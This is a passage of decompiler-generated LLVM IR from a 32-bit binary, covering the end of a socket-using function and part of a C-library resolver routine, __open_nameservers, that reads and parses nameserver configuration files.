  %v2_804c6c5 = inttoptr i32 %v1_804c6c5 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c6c5, align 4
  %v1_804c6ca = add i32 %v1_804c6c4, -12
  %v2_804c6ca = inttoptr i32 %v1_804c6ca to i32*
  store i32 134526871, i32* %v2_804c6ca, align 4
  %v1_804c6cf = add i32 %v1_804c6c4, 184
  store i32 %v1_804c6cf, i32* %ebx.global-to-local, align 4
  %v2_804c6d6 = add i32 %v1_804c6c4, -16
  %v3_804c6d6 = inttoptr i32 %v2_804c6d6 to i32*
  store i32 %v1_804c6cf, i32* %v3_804c6d6, align 4
  %v3_804c6d7 = call i32 @__pthread_return_void(i32 %v1_804c6a5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c6d7, i32* %eax.global-to-local, align 4
  %v0_804c6dc = load i32, i32* @esp, align 4
  %v1_804c6dc = inttoptr i32 %v0_804c6dc to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c6dc, align 4
  %v2_804c6e3 = call i32 @__pthread_return_0(i32 %v1_804c6a5.pre-phi)
  store i32 %v2_804c6e3, i32* %eax.global-to-local, align 4
  %v0_804c6e8 = load i32, i32* @esp, align 4
  %v1_804c6e8 = add i32 %v0_804c6e8, 60
  %v2_804c6e8 = inttoptr i32 %v1_804c6e8 to i32*
  %v3_804c6e8 = load i32, i32* %v2_804c6e8, align 4
  store i32 %v3_804c6e8, i32* %eax.global-to-local, align 4
  %v1_804c6ec = add i32 %v0_804c6e8, 56
  %v2_804c6ec = inttoptr i32 %v1_804c6ec to i32*
  %v3_804c6ec = load i32, i32* %v2_804c6ec, align 4
  store i32 %v3_804c6ec, i32* %edx.global-to-local, align 4
  %v1_804c6f0 = trunc i32 %v3_804c6e8 to i16
  store i16 %v1_804c6f0, i16* @global_var_805215c.86, align 4
  %v1_804c6f6 = inttoptr i32 %v0_804c6e8 to i32*
  %v2_804c6f6 = load i32, i32* %v1_804c6f6, align 4
  store i32 %v2_804c6f6, i32* @eax, align 4
  %v3_804c6f6 = add i32 %v0_804c6e8, 4
  %v1_804c6f7 = sext i32 %v3_804c6ec to i64
  store i64 %v1_804c6f7, i64* @global_var_8052540.85, align 64
  %v1_804c6fd = inttoptr i32 %v3_804c6f6 to i32*
  %v2_804c6fd = load i32, i32* %v1_804c6fd, align 4
  store i32 %v2_804c6fd, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c6fd, align 4
  %v0_804c700 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c700, i32* %v1_804c6f6, align 4
  %v3_804c701 = call i32 @__pthread_return_void(i32 %v1_804c6a5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c701, i32* %eax.global-to-local, align 4
  %v0_804c706 = load i32, i32* @esp, align 4
  %v1_804c706 = add i32 %v0_804c706, 32
  %v2_804c706 = inttoptr i32 %v1_804c706 to i32*
  store i32 -1, i32* %v2_804c706, align 4
  br label %dec_label_pc_804c70e

dec_label_pc_804c70e:                             ; preds = %dec_label_pc_804c582, %dec_label_pc_804c6c4
  %v0_804c70e = load i32, i32* @esp, align 4
  %v1_804c70e = add i32 %v0_804c70e, 16
  br label %dec_label_pc_804c711

dec_label_pc_804c711:                             ; preds = %dec_label_pc_804c69e.dec_label_pc_804c711_crit_edge, %dec_label_pc_804c70e
  %v0_804c711 = phi i32 [ %v0_804c711.pre, %dec_label_pc_804c69e.dec_label_pc_804c711_crit_edge ], [ %v1_804c70e, %dec_label_pc_804c70e ]
  %v1_804c711 = add i32 %v0_804c711, 16
  %v2_804c711 = inttoptr i32 %v1_804c711 to i32*
  %v3_804c711 = load i32, i32* %v2_804c711, align 4
  store i32 %v3_804c711, i32* %eax.global-to-local, align 4
  %v1_804c715 = add i32 %v0_804c711, 220
  %v1_804c71b = inttoptr i32 %v1_804c715 to i32*
  %v2_804c71b = load i32, i32* %v1_804c71b, align 4
  store i32 %v2_804c71b, i32* @ebx, align 4
  %v3_804c71b = add i32 %v0_804c711, 224
  %v1_804c71c = inttoptr i32 %v3_804c71b to i32*
  %v2_804c71c = load i32, i32* %v1_804c71c, align 4
  store i32 %v2_804c71c, i32* @esi, align 4
  %v3_804c71c = add i32 %v0_804c711, 228
  %v1_804c71d = inttoptr i32 %v3_804c71c to i32*
  %v2_804c71d = load i32, i32* %v1_804c71d, align 4
  store i32 %v2_804c71d, i32* @edi, align 4
  %v3_804c71d = add i32 %v0_804c711, 232
  %v1_804c71e = inttoptr i32 %v3_804c71d to i32*
  %v2_804c71e = load i32, i32* %v1_804c71e, align 4
  store i32 %v2_804c71e, i32* @ebp, align 4
  ret i32 %v3_804c711

; uselistorder directives
  uselistorder i32 %v0_804c711, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c6e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c69e, { 1, 0 }
  uselistorder i32 %v1_804c6a5.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_804c650.pre, { 1, 0 }
  uselistorder i32 %v5_804c623, { 1, 0 }
  uselistorder i32 %v3_804c623, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c5eb, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c5b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c582, { 1, 0 }
  uselistorder i32 %v3_804c561, { 1, 0, 2 }
  uselistorder i32 %v0_804c552, { 1, 0 }
  uselistorder i32 %v5_804c548, { 1, 0 }
  uselistorder i32* %v3_804c548, { 1, 0 }
  uselistorder i32 %v0_804c41e81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804c548, { 2, 1, 0 }
  uselistorder i32 %v5_804c542, { 1, 0 }
  uselistorder i32 %v1_804c541, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c53d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c501, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804c4db, { 1, 0 }
  uselistorder i32 %v1_804c4cc, { 1, 0 }
  uselistorder i32 %v3_804c49d, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c48b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804c432, { 1, 2, 0 }
  uselistorder i32 %v0_804c432, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804c40c, { 1, 0 }
  uselistorder i32 %v0_804c40c.pre, { 2, 1, 0 }
  uselistorder i32 %v0_804c402, { 1, 2, 0 }
  uselistorder i32 %v0_804c41468, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804c40c58, { 1, 0 }
  uselistorder i32 %v5_804c3ae, { 1, 0 }
  uselistorder i32* %v2_804c3ae, { 1, 0, 2 }
  uselistorder i32 %v3_804c366, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c34c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804c34c, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_804c32b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c30b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c2b1, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804c296, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804c27f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c207, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c1ba, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c19b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804c17f, { 1, 0 }
  uselistorder i32 %v3_804c174, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804c171, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804c116, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804c111, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c0fa, { 1, 0 }
  uselistorder i32 %v1_804c0c6, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804c0b795, { 2, 1, 0 }
  uselistorder i16 %v0_804c077, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_804c070, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804bfe2, { 3, 8, 4, 10, 2, 11, 7, 1, 0, 9, 5, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 69, 66, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 10000, { 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805215c.86, { 2, 1, 0 }
  uselistorder i64* @global_var_8052540.85, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8052528.84 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8052528.84, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c711, { 1, 0 }
  uselistorder label %dec_label_pc_804c70e, { 1, 0 }
  uselistorder label %dec_label_pc_804c69e, { 1, 0 }
  uselistorder label %dec_label_pc_804c688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c675, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c650.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c648, { 1, 0 }
  uselistorder label %dec_label_pc_804c62f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c5e4, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804c582, { 1, 0 }
  uselistorder label %dec_label_pc_804c552, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804c548, { 1, 0 }
  uselistorder label %dec_label_pc_804c53d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c53a, { 1, 0 }
  uselistorder label %dec_label_pc_804c4b5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c3fd, { 1, 0 }
  uselistorder label %dec_label_pc_804c27f, { 1, 0 }
  uselistorder label %dec_label_pc_804c248, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ba, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c0c6, { 1, 0 }
  uselistorder label %dec_label_pc_804c0b0, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804c720 = load i32, i32* @ebp, align 4
  store i32 134526871, i32* %stack_var_-216, align 4
  %v3_804c72f = ptrtoint i32* %stack_var_-216 to i32
  %v2_804c734 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c734, i32* @eax, align 4
  %v2_804c73c = call i32 @__pthread_return_void(i32 %v2_804c734, i32 134526871)
  %v1_804c748 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 %v1_804c748, i32* @eax, align 4
  %v0_804c750 = load i32, i32* @global_var_8054994.33, align 4
  %tmp41 = icmp slt i32 %v0_804c750, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_804c947, label %dec_label_pc_804c75d

dec_label_pc_804c75d:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805081e.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c769 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80507ec.90 to i32), i32 ptrtoint (i32* @global_var_805081e.89 to i32))
  store i32 %v2_804c769, i32* @eax, align 4
  %v1_804c771 = icmp eq i32 %v2_804c769, 0
  store i32 %v2_804c769, i32* @ebp, align 4
  %v1_804c775 = icmp eq i1 %v1_804c771, false
  br i1 %v1_804c775, label %dec_label_pc_804c912.preheader, label %dec_label_pc_804c77b

dec_label_pc_804c77b:                             ; preds = %dec_label_pc_804c75d
  store i32 ptrtoint (i32* @global_var_805081e.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c787 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_80507fd.91 to i32), i32 ptrtoint (i32* @global_var_805081e.89 to i32))
  %v1_804c78f = icmp eq i32 %v2_804c787, 0
  store i32 %v2_804c787, i32* @ebp, align 4
  %v1_804c793 = icmp eq i1 %v1_804c78f, false
  br i1 %v1_804c793, label %dec_label_pc_804c912.preheader, label %dec_label_pc_804c93c

dec_label_pc_804c912.preheader:                   ; preds = %dec_label_pc_804c75d, %dec_label_pc_804c77b
  %v2_804c919 = ptrtoint i32* %stack_var_-180 to i32
  %v3_804c84d = add i32 %v3_804c72f, 164
  %v4_804c83c = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804c912

dec_label_pc_804c79e:                             ; preds = %dec_label_pc_804c7a9
  %v1_804c79e = add i32 %v0_804c79e56, 1
  store i32 %v1_804c79e, i32* @ebx, align 4
  %v1_804c79f = inttoptr i32 %v1_804c79e to i8*
  %v2_804c79f = load i8, i8* %v1_804c79f, align 1
  %v3_804c79f = zext i8 %v2_804c79f to i32
  %v5_804c79f = and i32 %v6_804c79f59, -256
  %v6_804c79f = or i32 %v3_804c79f, %v5_804c79f
  store i32 %v6_804c79f, i32* @ecx, align 4
  %v4_804c7a1 = icmp eq i8 %v2_804c79f, 0
  br i1 %v4_804c7a1, label %dec_label_pc_804c912, label %dec_label_pc_804c7a9

dec_label_pc_804c7a9:                             ; preds = %dec_label_pc_804c7a9.lr.ph, %dec_label_pc_804c79e
  %v6_804c79f59 = phi i32 [ %v6_804c79f53, %dec_label_pc_804c7a9.lr.ph ], [ %v6_804c79f, %dec_label_pc_804c79e ]
  %v2_804c79f58 = phi i8 [ %v2_804c79f50, %dec_label_pc_804c7a9.lr.ph ], [ %v2_804c79f, %dec_label_pc_804c79e ]
  %v1_804c79f57 = phi i8* [ %v1_804c79f49, %dec_label_pc_804c7a9.lr.ph ], [ %v1_804c79f, %dec_label_pc_804c79e ]
  %v0_804c79e56 = phi i32 [ %v0_804c79f.pre, %dec_label_pc_804c7a9.lr.ph ], [ %v1_804c79e, %dec_label_pc_804c79e ]
  store i32 %v0_804c7a9.pre, i32* @eax, align 4
  %v2_804c7ae = sext i8 %v2_804c79f58 to i32
  store i32 %v2_804c7ae, i32* @edx, align 4
  %v2_804c7b1 = mul nsw i32 %v2_804c7ae, 2
  %v3_804c7b1 = add i32 %v0_804c7a9.pre, %v2_804c7b1
  %v4_804c7b1 = inttoptr i32 %v3_804c7b1 to i8*
  %v5_804c7b1 = load i8, i8* %v4_804c7b1, align 1
  %v6_804c7b1 = and i8 %v5_804c7b1, 32
  %v7_804c7b1 = icmp eq i8 %v6_804c7b1, 0
  %v1_804c7b5 = icmp eq i1 %v7_804c7b1, false
  br i1 %v1_804c7b5, label %dec_label_pc_804c79e, label %dec_label_pc_804c7b7

dec_label_pc_804c7b7:                             ; preds = %dec_label_pc_804c7a9
  %v10_804c7b7 = icmp eq i8 %v2_804c79f58, 10
  br i1 %v10_804c7b7, label %dec_label_pc_804c912, label %dec_label_pc_804c7c0

dec_label_pc_804c7c0:                             ; preds = %dec_label_pc_804c7b7
  %v10_804c7c0 = icmp eq i8 %v2_804c79f58, 35
  %v1_804c7cb = icmp eq i1 %v10_804c7c0, false
  br i1 %v1_804c7cb, label %dec_label_pc_804c81c.preheader, label %dec_label_pc_804c912

dec_label_pc_804c81c.preheader:                   ; preds = %dec_label_pc_804c7c0
  %v2_804c81c6 = load i8, i8* %v1_804c79f57, align 1
  %v3_804c81c7 = icmp eq i8 %v2_804c81c6, 0
  br i1 %v3_804c81c7, label %dec_label_pc_804c828, label %dec_label_pc_804c821

dec_label_pc_804c7d2:                             ; preds = %dec_label_pc_804c821
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804c7d6 = load i32, i32* @esp, align 4
  %v3_804c7d6 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804c7d6 = add nuw nsw i32 %v3_804c7d6, 152
  %v5_804c7d6 = add i32 %v4_804c7d6, %v1_804c7d6
  %v6_804c7d6 = inttoptr i32 %v5_804c7d6 to i32*
  store i32 %v0_804c7d6, i32* %v6_804c7d6, align 4
  %v0_804c7e0.pre = load i32, i32* @ebx, align 4
  %v4_804c7e0.pre = load i32, i32* @ecx, align 4
  %v1_804c7e060 = inttoptr i32 %v0_804c7e0.pre to i8*
  %v2_804c7e061 = load i8, i8* %v1_804c7e060, align 1
  %v3_804c7e062 = zext i8 %v2_804c7e061 to i32
  %v5_804c7e063 = and i32 %v4_804c7e0.pre, -256
  %v6_804c7e064 = or i32 %v3_804c7e062, %v5_804c7e063
  %v4_804c7e265 = icmp eq i8 %v2_804c7e061, 0
  br i1 %v4_804c7e265, label %dec_label_pc_804c7ff.preheader, label %dec_label_pc_804c7e6.lr.ph

dec_label_pc_804c7e6.lr.ph:                       ; preds = %dec_label_pc_804c7d2
  %v0_804c7e6.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c7e6

dec_label_pc_804c7df:                             ; preds = %dec_label_pc_804c7f4
  %v1_804c7df = add i32 %v0_804c7df67, 1
  store i32 %v1_804c7df, i32* @ebx, align 4
  %v1_804c7e0 = inttoptr i32 %v1_804c7df to i8*
  %v2_804c7e0 = load i8, i8* %v1_804c7e0, align 1
  %v3_804c7e0 = zext i8 %v2_804c7e0 to i32
  %v5_804c7e0 = and i32 %v6_804c7e069, -256
  %v6_804c7e0 = or i32 %v3_804c7e0, %v5_804c7e0
  %v4_804c7e2 = icmp eq i8 %v2_804c7e0, 0
  br i1 %v4_804c7e2, label %dec_label_pc_804c7ff.preheader, label %dec_label_pc_804c7e6

dec_label_pc_804c7e6:                             ; preds = %dec_label_pc_804c7e6.lr.ph, %dec_label_pc_804c7df
  %v6_804c7e069 = phi i32 [ %v6_804c7e064, %dec_label_pc_804c7e6.lr.ph ], [ %v6_804c7e0, %dec_label_pc_804c7df ]
  %v2_804c7e068 = phi i8 [ %v2_804c7e061, %dec_label_pc_804c7e6.lr.ph ], [ %v2_804c7e0, %dec_label_pc_804c7df ]
  %v0_804c7df67 = phi i32 [ %v0_804c7e0.pre, %dec_label_pc_804c7e6.lr.ph ], [ %v1_804c7df, %dec_label_pc_804c7df ]
  store i32 %v0_804c7e6.pre, i32* @eax, align 4
  %v2_804c7eb = sext i8 %v2_804c7e068 to i32
  store i32 %v2_804c7eb, i32* @edx, align 4
  %v2_804c7ee = mul nsw i32 %v2_804c7eb, 2
  %v3_804c7ee = add i32 %v0_804c7e6.pre, %v2_804c7ee
  %v4_804c7ee = inttoptr i32 %v3_804c7ee to i8*
  %v5_804c7ee = load i8, i8* %v4_804c7ee, align 1
  %v6_804c7ee = and i8 %v5_804c7ee, 32
  %v7_804c7ee = icmp eq i8 %v6_804c7ee, 0
  %v1_804c7f2 = icmp eq i1 %v7_804c7ee, false
  br i1 %v1_804c7f2, label %dec_label_pc_804c7ff.preheader, label %dec_label_pc_804c7f4

dec_label_pc_804c7f4:                             ; preds = %dec_label_pc_804c7e6
  %v10_804c7f4 = icmp eq i8 %v2_804c7e068, 10
  %v1_804c7f7 = icmp eq i1 %v10_804c7f4, false
  br i1 %v1_804c7f7, label %dec_label_pc_804c7df, label %dec_label_pc_804c7ff.preheader

dec_label_pc_804c7ff.preheader:                   ; preds = %dec_label_pc_804c7f4, %dec_label_pc_804c7e6, %dec_label_pc_804c7df, %dec_label_pc_804c7d2
  %v0_804c7df.lcssa = phi i32 [ %v0_804c7e0.pre, %dec_label_pc_804c7d2 ], [ %v1_804c7df, %dec_label_pc_804c7df ], [ %v0_804c7df67, %dec_label_pc_804c7e6 ], [ %v0_804c7df67, %dec_label_pc_804c7f4 ]
  %v6_804c7e0.lcssa = phi i32 [ %v6_804c7e064, %dec_label_pc_804c7d2 ], [ %v6_804c7e0, %dec_label_pc_804c7df ], [ %v6_804c7e069, %dec_label_pc_804c7e6 ], [ %v6_804c7e069, %dec_label_pc_804c7f4 ]
  %v1_804c7ff75 = inttoptr i32 %v0_804c7df.lcssa to i8*
  %v2_804c7ff76 = load i8, i8* %v1_804c7ff75, align 1
  %v3_804c7ff77 = zext i8 %v2_804c7ff76 to i32
  %v5_804c7ff78 = and i32 %v6_804c7e0.lcssa, -256
  %v6_804c7ff79 = or i32 %v3_804c7ff77, %v5_804c7ff78
  store i32 %v6_804c7ff79, i32* @ecx, align 4
  %v4_804c80180 = icmp eq i8 %v2_804c7ff76, 0
  br i1 %v4_804c80180, label %dec_label_pc_804c818, label %dec_label_pc_804c805

dec_label_pc_804c7fb:                             ; preds = %dec_label_pc_804c813, %dec_label_pc_804c805
  store i8 0, i8* %v1_804c7ff83, align 1
  %v0_804c7fe = load i32, i32* @ebx, align 4
  %v1_804c7fe = add i32 %v0_804c7fe, 1
  store i32 %v1_804c7fe, i32* @ebx, align 4
  %v4_804c7ff.pre = load i32, i32* @ecx, align 4
  %v1_804c7ff = inttoptr i32 %v1_804c7fe to i8*
  %v2_804c7ff = load i8, i8* %v1_804c7ff, align 1
  %v3_804c7ff = zext i8 %v2_804c7ff to i32
  %v5_804c7ff = and i32 %v4_804c7ff.pre, -256
  %v6_804c7ff = or i32 %v3_804c7ff, %v5_804c7ff
  store i32 %v6_804c7ff, i32* @ecx, align 4
  %v4_804c801 = icmp eq i8 %v2_804c7ff, 0
  br i1 %v4_804c801, label %dec_label_pc_804c818, label %dec_label_pc_804c805

dec_label_pc_804c805:                             ; preds = %dec_label_pc_804c7ff.preheader, %dec_label_pc_804c7fb
  %v2_804c7ff84 = phi i8 [ %v2_804c7ff, %dec_label_pc_804c7fb ], [ %v2_804c7ff76, %dec_label_pc_804c7ff.preheader ]
  %v1_804c7ff83 = phi i8* [ %v1_804c7ff, %dec_label_pc_804c7fb ], [ %v1_804c7ff75, %dec_label_pc_804c7ff.preheader ]
  %v0_804c81c82 = phi i32 [ %v1_804c7fe, %dec_label_pc_804c7fb ], [ %v0_804c7df.lcssa, %dec_label_pc_804c7ff.preheader ]
  %v0_804c805 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804c805, i32* @eax, align 4
  %v2_804c80a = sext i8 %v2_804c7ff84 to i32
  store i32 %v2_804c80a, i32* @edx, align 4
  %v2_804c80d = mul nsw i32 %v2_804c80a, 2
  %v3_804c80d = add i32 %v0_804c805, %v2_804c80d
  %v4_804c80d = inttoptr i32 %v3_804c80d to i8*
  %v5_804c80d = load i8, i8* %v4_804c80d, align 1
  %v6_804c80d = and i8 %v5_804c80d, 32
  %v7_804c80d = icmp eq i8 %v6_804c80d, 0
  %v1_804c811 = icmp eq i1 %v7_804c80d, false
  br i1 %v1_804c811, label %dec_label_pc_804c7fb, label %dec_label_pc_804c813

dec_label_pc_804c813:                             ; preds = %dec_label_pc_804c805
  %v10_804c813 = icmp eq i8 %v2_804c7ff84, 10
  br i1 %v10_804c813, label %dec_label_pc_804c7fb, label %dec_label_pc_804c818

dec_label_pc_804c818:                             ; preds = %dec_label_pc_804c7fb, %dec_label_pc_804c813, %dec_label_pc_804c7ff.preheader
  %v0_804c81c.lcssa = phi i32 [ %v0_804c7df.lcssa, %dec_label_pc_804c7ff.preheader ], [ %v0_804c81c82, %dec_label_pc_804c813 ], [ %v1_804c7fe, %dec_label_pc_804c7fb ]
  %v1_804c7ff.lcssa = phi i8* [ %v1_804c7ff75, %dec_label_pc_804c7ff.preheader ], [ %v1_804c7ff83, %dec_label_pc_804c813 ], [ %v1_804c7ff, %dec_label_pc_804c7fb ]
  %v4_804c818 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804c81c = load i8, i8* %v1_804c7ff.lcssa, align 1
  %v3_804c81c = icmp eq i8 %v2_804c81c, 0
  br i1 %v3_804c81c, label %dec_label_pc_804c828, label %dec_label_pc_804c821

dec_label_pc_804c821:                             ; preds = %dec_label_pc_804c81c.preheader, %dec_label_pc_804c818
  %v0_804c7d6 = phi i32 [ %v0_804c81c.lcssa, %dec_label_pc_804c818 ], [ %v0_804c79e56, %dec_label_pc_804c81c.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804c818, %dec_label_pc_804c818 ], [ 0, %dec_label_pc_804c81c.preheader ]
  %v7_804c826 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804c826, label %dec_label_pc_804c828, label %dec_label_pc_804c7d2

dec_label_pc_804c828:                             ; preds = %dec_label_pc_804c818, %dec_label_pc_804c821, %dec_label_pc_804c81c.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804c81c.preheader ], [ %v4_804c818, %dec_label_pc_804c818 ], [ %stack_var_-196.013, %dec_label_pc_804c821 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804c82f = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8050815.92 to i32), i32* %stack_var_-216, align 4
  %v5_804c83c = call i32 @__GI_strcoll(i8* %v4_804c83c, i32 ptrtoint ([11 x i8]* @global_var_8050815.92 to i32), i32 %v0_804c82f, i32 %v0_804c82f)
  store i32 %v5_804c83c, i32* @eax, align 4
  %v1_804c844 = icmp eq i32 %v5_804c83c, 0
  br i1 %v1_804c844, label %dec_label_pc_804c86c.preheader, label %dec_label_pc_804c87d

dec_label_pc_804c86c.preheader:                   ; preds = %dec_label_pc_804c828
  %v0_804c86c89 = load i32, i32* @esi, align 4
  %v5_804c87094 = icmp slt i32 %v0_804c86c89, %stack_var_-196.0.lcssa
  br i1 %v5_804c87094, label %dec_label_pc_804c872.lr.ph, label %dec_label_pc_804c87d

dec_label_pc_804c872.lr.ph:                       ; preds = %dec_label_pc_804c86c.preheader
  %v0_804c872.pre = load i32, i32* @global_var_8054994.33, align 4
  br label %dec_label_pc_804c872

dec_label_pc_804c84a:                             ; preds = %dec_label_pc_804c872
  %v2_804c84d = mul i32 %v0_804c86c95, 4
  %v4_804c84d = add i32 %v2_804c84d, %v3_804c84d
  %v5_804c84d = inttoptr i32 %v4_804c84d to i32*
  %v6_804c84d = load i32, i32* %v5_804c84d, align 4
  %v1_804c854 = add i32 %v0_804c86c95, 1
  store i32 %v1_804c854, i32* @esi, align 4
  %v1_804c855 = inttoptr i32 %v6_804c84d to i8*
  %v2_804c855 = call i32 @__GI_strdup(i8* %v1_804c855)
  %v1_804c85d = load i32, i32* @ebx, align 4
  %v2_804c85d = mul i32 %v1_804c85d, 4
  %v3_804c85d = add i32 %v2_804c85d, 134564232
  %v4_804c85d = inttoptr i32 %v3_804c85d to i32*
  store i32 %v2_804c855, i32* %v4_804c85d, align 4
  %v0_804c864 = load i32, i32* @ebx, align 4
  %v1_804c864 = add i32 %v0_804c864, 1
  store i32 %v1_804c864, i32* @eax, align 4
  store i32 %v1_804c864, i32* @global_var_8054994.33, align 4
  %v0_804c86c = load i32, i32* @esi, align 4
  %v5_804c870 = icmp slt i32 %v0_804c86c, %stack_var_-196.0.lcssa
  br i1 %v5_804c870, label %dec_label_pc_804c872, label %dec_label_pc_804c87d

dec_label_pc_804c872:                             ; preds = %dec_label_pc_804c872.lr.ph, %dec_label_pc_804c84a
  %v0_804c872 = phi i32 [ %v0_804c872.pre, %dec_label_pc_804c872.lr.ph ], [ %v1_804c864, %dec_label_pc_804c84a ]
  %v0_804c86c95 = phi i32 [ %v0_804c86c89, %dec_label_pc_804c872.lr.ph ], [ %v0_804c86c, %dec_label_pc_804c84a ]
  store i32 %v0_804c872, i32* @ebx, align 4
  %v7_804c87b = icmp sgt i32 %v0_804c872, 2
  br i1 %v7_804c87b, label %dec_label_pc_804c87d, label %dec_label_pc_804c84a

dec_label_pc_804c87d:                             ; preds = %dec_label_pc_804c86c.preheader, %dec_label_pc_804c84a, %dec_label_pc_804c872, %dec_label_pc_804c828
  %v0_804c87d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050820.93 to i32), i32* %stack_var_-216, align 4
